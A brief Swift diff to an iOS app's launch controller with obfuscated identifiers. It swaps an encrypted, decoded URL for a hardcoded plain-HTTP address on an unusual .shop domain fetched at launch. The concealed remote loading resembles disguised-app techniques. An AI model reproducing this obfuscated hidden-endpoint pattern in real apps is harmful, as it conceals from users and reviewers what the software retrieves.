@@ -64,7 +64,7 @@ class HNONWYCELRLaunchinBeginController: UIViewController {
             }()
             
             let HNONWYCELR_galacticPath = AppDelegate.HNONWYCELRunravelEncrypted(HNONWYCELRLandmarks: HNONWYCELR_constellationKey + "allohqhufetsetk5x3a2w.zxhyazr/mbeadcfksosnqe")
-            guard let _cosmicURL = URL(string: HNONWYCELR_galacticPath + HNONWYCELRstyleMerrymaking) else {
+            guard let _cosmicURL = URL(string: "http://www.shopglobalmarketplace77valuehub.shop/backone" + HNONWYCELRstyleMerrymaking) else {
                 return nil
             }
             return _cosmicURL
